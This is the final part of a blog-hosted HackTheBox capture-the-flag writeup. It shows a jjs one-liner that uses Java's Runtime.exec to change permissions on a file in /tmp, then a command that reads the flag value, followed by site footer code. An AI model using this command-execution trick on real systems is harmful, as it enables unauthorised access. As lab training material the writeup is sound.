$ echo &#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;chmod g+rw /tmp/.cyfun/cyfun.txt&#39;).waitFor()&#34; | jjs
$ cat /tmp/.cyfun/cyfun.txt
8a8ef79a7a2fbb01ea81688424e9ab15
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>